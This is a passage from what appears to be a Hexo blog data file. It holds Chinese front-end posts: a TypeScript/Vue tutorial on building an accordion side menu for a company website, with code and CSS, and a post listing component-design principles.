&#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;电梯司机&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;停车管理&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;消防工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;拆迁工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;团队风采&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;风采展示&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;新闻中心&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;新闻中心&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;人才招聘&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;招聘详情&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;联系我们&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;联系方式&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p><code>数据结构</code> 决定 <code>业务逻辑</code> 与 <code>实现思路</code></p>\n<hr>\n<h3 id=\"第二步-根据数据实现虚拟DOM\"><a href=\"#第二步-根据数据实现虚拟DOM\" class=\"headerlink\" title=\"第二步 根据数据实现虚拟DOM\"></a>第二步 根据数据实现虚拟DOM</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public listFor(h: CreateElement) &#123;</span><br><span class=\"line\">  let res = [];</span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    let dd = [];</span><br><span class=\"line\">    for (let n = 0; n &lt; this.list[i].item.length; n++) &#123;</span><br><span class=\"line\">        dd.push(</span><br><span class=\"line\">          &lt;span&gt;</span><br><span class=\"line\">            &lt;router-link to=&#123;this.list[i].item[n].url&#125;&gt;&#123;this.list[i].item[n].name&#125;&lt;/router-link&gt;</span><br><span class=\"line\">          &lt;/span&gt;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    res.push(</span><br><span class=\"line\">      &lt;dl&gt;</span><br><span class=\"line\">        &lt;dt onClick=&#123;() =&gt; &#123; this.cardList(i + 1) &#125;&#125;&gt;</span><br><span class=\"line\">          &lt;span class=&#123;this.listNum === i + 1 ? &apos;show&apos; : &apos;&apos;&#125;&gt;&#123;this.list[i].card&#125;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/dt&gt;</span><br><span class=\"line\">        &lt;dd class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;&gt;</span><br><span class=\"line\">          &#123;dd&#125;</span><br><span class=\"line\">        &lt;/dd&gt;</span><br><span class=\"line\">      &lt;/dl &gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return res</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"第三步-两个生命周期\"><a href=\"#第三步-两个生命周期\" class=\"headerlink\" title=\"第三步 两个生命周期\"></a>第三步 两个生命周期</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// vue生命周期 挂载时执行</span><br><span class=\"line\">public mounted() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// vue生命周期 页面数据更新时执行</span><br><span class=\"line\">public updated() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步-业务逻辑\"><a href=\"#第四步-业务逻辑\" class=\"headerlink\" title=\"第四步 业务逻辑\"></a>第四步 业务逻辑</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public showdd() &#123;</span><br><span class=\"line\">  let sideMenu = document.getElementsByClassName(&apos;sideMenu&apos;)[0];</span><br><span class=\"line\">  </span><br><span class=\"line\">  // 此循环为了每次点击前所有列表高度清零</span><br><span class=\"line\">  for (let i = 0; i &lt; sideMenu.children.length; i++) &#123;</span><br><span class=\"line\">    let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\">    evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    /** 取得每个`dd`的Dom元素 */</span><br><span class=\"line\">    let dd = sideMenu.getElementsByClassName(`showdd$&#123;i&#125;`)[0]; </span><br><span class=\"line\">    </span><br><span class=\"line\">    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据</span><br><span class=\"line\">    if (dd !== undefined) &#123;</span><br><span class=\"line\">      dd.setAttribute(&apos;style&apos;, `height:$&#123;itemLen * 36&#125;px`)</span><br><span class=\"line\">      console.log(&apos;get H&apos;, dd.clientHeight);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(itemLen);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第五步-CSS样式\"><a href=\"#第五步-CSS样式\" class=\"headerlink\" title=\"第五步 CSS样式\"></a>第五步 CSS样式</h3><p>此步骤为样式的实现，根据 <code>class</code> 或 <code>id</code> 实现<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ele&#123;</span><br><span class=\"line\">    overflow: hidden;</span><br><span class=\"line\">    opacity: 0; // 不太需要</span><br><span class=\"line\">    height: 0;</span><br><span class=\"line\">    transition: all .5s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ele.show &#123;</span><br><span class=\"line\">    opacity: 1; // 可以省略</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>具体实现详见 <code>shrs</code>  四海日盛官网项目 <code>list.tsx</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"TS-ES6-VUE-实现手风琴特效\"><a href=\"#TS-ES6-VUE-实现手风琴特效\" class=\"headerlink\" title=\"TS + ES6 + VUE 实现手风琴特效\"></a>TS + ES6 + VUE 实现手风琴特效</h2><hr>\n<h3 id=\"第一步-定义-数据结构\"><a href=\"#第一步-定义-数据结构\" class=\"headerlink\" title=\"第一步 定义 数据结构\"></a>第一步 定义 数据结构</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public list: any = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;走进四海&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;四海简介&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;荣誉证书&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;服务项目&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./server&apos;,</span><br><span class=\"line\">        name: &apos;服务项目&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;施工案例&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;成品保护&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;保洁&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;外墙清洗&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;石材翻新&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;家政服务&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;电梯司机&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;停车管理&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;消防工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;拆迁工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;团队风采&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;风采展示&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;新闻中心&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;新闻中心&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;人才招聘&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;招聘详情&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;联系我们&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;联系方式&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p><code>数据结构</code> 决定 <code>业务逻辑</code> 与 <code>实现思路</code></p>\n<hr>\n<h3 id=\"第二步-根据数据实现虚拟DOM\"><a href=\"#第二步-根据数据实现虚拟DOM\" class=\"headerlink\" title=\"第二步 根据数据实现虚拟DOM\"></a>第二步 根据数据实现虚拟DOM</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public listFor(h: CreateElement) &#123;</span><br><span class=\"line\">  let res = [];</span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    let dd = [];</span><br><span class=\"line\">    for (let n = 0; n &lt; this.list[i].item.length; n++) &#123;</span><br><span class=\"line\">        dd.push(</span><br><span class=\"line\">          &lt;span&gt;</span><br><span class=\"line\">            &lt;router-link to=&#123;this.list[i].item[n].url&#125;&gt;&#123;this.list[i].item[n].name&#125;&lt;/router-link&gt;</span><br><span class=\"line\">          &lt;/span&gt;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    res.push(</span><br><span class=\"line\">      &lt;dl&gt;</span><br><span class=\"line\">        &lt;dt onClick=&#123;() =&gt; &#123; this.cardList(i + 1) &#125;&#125;&gt;</span><br><span class=\"line\">          &lt;span class=&#123;this.listNum === i + 1 ? &apos;show&apos; : &apos;&apos;&#125;&gt;&#123;this.list[i].card&#125;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/dt&gt;</span><br><span class=\"line\">        &lt;dd class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;&gt;</span><br><span class=\"line\">          &#123;dd&#125;</span><br><span class=\"line\">        &lt;/dd&gt;</span><br><span class=\"line\">      &lt;/dl &gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return res</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"第三步-两个生命周期\"><a href=\"#第三步-两个生命周期\" class=\"headerlink\" title=\"第三步 两个生命周期\"></a>第三步 两个生命周期</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// vue生命周期 挂载时执行</span><br><span class=\"line\">public mounted() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// vue生命周期 页面数据更新时执行</span><br><span class=\"line\">public updated() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步-业务逻辑\"><a href=\"#第四步-业务逻辑\" class=\"headerlink\" title=\"第四步 业务逻辑\"></a>第四步 业务逻辑</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public showdd() &#123;</span><br><span class=\"line\">  let sideMenu = document.getElementsByClassName(&apos;sideMenu&apos;)[0];</span><br><span class=\"line\">  </span><br><span class=\"line\">  // 此循环为了每次点击前所有列表高度清零</span><br><span class=\"line\">  for (let i = 0; i &lt; sideMenu.children.length; i++) &#123;</span><br><span class=\"line\">    let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\">    evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    /** 取得每个`dd`的Dom元素 */</span><br><span class=\"line\">    let dd = sideMenu.getElementsByClassName(`showdd$&#123;i&#125;`)[0]; </span><br><span class=\"line\">    </span><br><span class=\"line\">    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据</span><br><span class=\"line\">    if (dd !== undefined) &#123;</span><br><span class=\"line\">      dd.setAttribute(&apos;style&apos;, `height:$&#123;itemLen * 36&#125;px`)</span><br><span class=\"line\">      console.log(&apos;get H&apos;, dd.clientHeight);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(itemLen);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第五步-CSS样式\"><a href=\"#第五步-CSS样式\" class=\"headerlink\" title=\"第五步 CSS样式\"></a>第五步 CSS样式</h3><p>此步骤为样式的实现，根据 <code>class</code> 或 <code>id</code> 实现<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ele&#123;</span><br><span class=\"line\">    overflow: hidden;</span><br><span class=\"line\">    opacity: 0; // 不太需要</span><br><span class=\"line\">    height: 0;</span><br><span class=\"line\">    transition: all .5s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ele.show &#123;</span><br><span class=\"line\">    opacity: 1; // 可以省略</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>具体实现详见 <code>shrs</code>  四海日盛官网项目 <code>list.tsx</code></p>\n"},{"title":"组件化设计思路","date":"2018-09-13T08:41:49.000Z","_content":"组件化的设计思路\n\n组件封装有一定的不确定性，更多时候在几方面做个权衡，在最开始并不可能做到完美，在业务的不断变化中，可能还会面临一些调整和重构\n\n组件化的意义\n1 组件化是实现分层。更有效的代码组合方式\n2 组件化是对资源的重组和优化，从而是项目管理更加合理\n3 有利于单元测试\n4 对重构友好\n\n\n组件的定义\n1 可复用的模块，完成既定的功能\n2 有明确的接口规定\n3 有上下文依赖 外部依赖资源定义\n4 可以独立发布\n\n组件设计的原则 主要的是复用性\n1 使用单一职责原则\n2 适用开放封闭原则\n3 追求短小精悍\n4 避免太多参数\n5 缩小信赖范围和想稳定方向的信赖\n6 追求无副作用\n7 追求透明化\n8 入口处检查参数的有效性，出口处检查返回的正确性\n9 充分隔离变化的部分\n\n自省的几个问题\n组件是否有必要再分\n组件划分的依据通常是业务逻辑、功能、要考虑组件之间的关系是否明确\n划分粒度的大小需要根据实际情况权衡，大小会提升维护成本，太大又不够灵活和高复用性\n每一个组件都应该有起独特的划分目的，有的是为了复用实现，有的是为了封装的复杂度清晰业务实现\n\n2 组件的依赖是否可以再缩减\n3 组件的可复用于其他类似场景中\n在考虑需要适用的不同场景，在组件接口设计时需要兼容\n4 组件当别人使用时，会怎么想\n5 假如业务需要不需要这个功能，是否清楚方便\n\n\n### 敲代码的李二狗:\n\n[为什么说 Java 程序员必须掌握 Spring Boot ？](https://kb.cnblogs.com/page/606682/)\n\n","source":"_posts/FrontEnd/WebFrameWork/组件化设计思路.md","raw":"---\ntitle: 组件化设计思路\ndate: 2018-09-13 16:41:49\ntags: Compinent\ncategories: Component-design\n---\n组件化的设计思路\n\n组件封装有一定的不确定性，更多时候在几方面做个权衡，在最开始并不可能做到完美，在业务的不断变化中，可能还会面临一些调整和重构\n\n组件化的意义\n1 组件化是实现分层。更有效的代码组合方式\n2 组件化是对资源的重组和优化，从而是项目管理更加合理\n3 有利于单元测试\n4 对重构友好\n\n\n组件的定义\n1 可复用的模块，完成既定的功能\n2 有明确的接口规定\n3 有上下文依赖 外部依赖资源定义\n4 可以独立发布\n\n组件设计的原则 主要的是复用性\n1 使用单一职责原则\n2 适用开放封闭原则\n3 追求短小精悍\n4 避免太多参数\n5 缩小信赖范围和想稳定方向的信赖\n6 追求无副作用\n7 追求透明化\n8 入口处检查参数的有效性，出口处检查返回的正确性\n9 充分隔离变化的部分\n\n自省的几个问题\n组件是否有必要再分\n组件划分的依据通常是业务逻辑、功能、要考虑组件之间的关系是否明确\n划分粒度的大小需要根据实际情况权衡，大小会提升维护成本，太大又不够灵活和高复用性\n每一个组件都应该有起独特的划分目的，有的是为了复用实现，有的是为了封装的复杂度清晰业务实现\n\n2 组件的依赖是否可以再缩减\n3 组件的可复用于其他类似场景中\n在考虑需要适用的不同场景，在组件接口设计时需要兼容\n4 组件当别人使用时，会怎么想\n5 假如业务需要不需要这个功能，是否清楚方便\n\n\n### 敲代码的李二狗:\n\n[为什么说 Java 程序员必须掌握 Spring Boot ？](https://kb.cnblogs.com/page/606682/)\n\n","slug":"FrontEnd/WebFrameWork/组件化设计思路","published":1,"updated":"2018-09-13T08:44:53.073Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0c00awzodvg7x1mqva","content":"<p>组件化的设计思路</p>\n<p>组件封装有一定的不确定性，更多时候在几方面做个权衡，在最开始并不可能做到完美，在业务的不断变化中，可能还会面临一些调整和重构</p>\n<p>组件化的意义<br>1 组件化是实现分层。更有效的代码组合方式<br>2 组件化是对资源的重组和优化，从而是项目管理更加合理<br>3 有利于单元测试<br>4 对重构友好</p>\n<p>组件的定义<br>1 可复用的模块，完成既定的功能<br>2 有明确的接口规定<br>3 有上下文依赖 外部依赖资源定义<br>4 可以独立发布</p>\n<p>组件设计的原则 主要的是复用性<br>1 使用单一职责原则<br>2 适用开放封闭原则<br>3 追求短小精悍<br>4 避免太多参数<br>5 缩小信赖范围和想稳定方向的信赖<br>6 追求无副作用<br>7 追求透明化<br>8 入口处检查参数的有效性，出口处检查返回的正确性<br>9 充分隔离变化的部分</p>\n<p>自省的几个问题<br>组件是否有必要再分<br>组件划分的依据通常是业务逻辑、功能、要考虑组件之间的关系是否明确<br>划分粒度的大小需要根据实际情况权衡，大小会提升维护成本，太大又不够灵活和高复用性<br>每一个组件都应该有起独特的划分目的，有的是为了复用实现，有的是为了封装的复杂度清晰业务实现</p>\n<p>2 组件的依赖是否可以再缩减<br>3 组件的可复用于其他类似场景中<br>在考虑需要适用的不同场景，在组件接口设计时需要兼容<br>4 组件当别人使用时，会怎么想<br>5 假如业务需要不需要这个功能，是否清楚方便</p>\n<h3 id=\"敲代码的李二狗\"><a href=\"#敲代码的李二狗\" class=\"headerlink\" title=\"敲代码的李二狗:\"></a>敲代码的李二狗:</h3><p><a href=\"https://kb.cnblogs.com/page/606682/\" target=\"_blank\" rel=\"noopener\">为什么说 Java 程序员必须掌握 Spring Boot ？</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>组件化的设计思路</p>\n<p>组件封装有一定的不确定性，更多时候在几方面做个权衡，在最开始并不可能做到完美，在业务的不断变化中，可能还会面临一些调整和重构</p>\n<p>组件化的意义<br>1 组件化是实现分层。更有效的代码组合方式<br>2 组件化是对资源的重组和优化，从而是项目管理更加合理<br>3 有利于单元测试<br>4 对重构友好</p>\n<p>组件的定义<br>1 可复用的模块，完成既定的功能<br>2 有明确的接口规定<br>3 有上下文依赖 外部依赖资源定义<br>4 可以独立发布</p>\n<p>组件设计的原则 主要的是复用性<br>1 使用单一职责原则<br>2 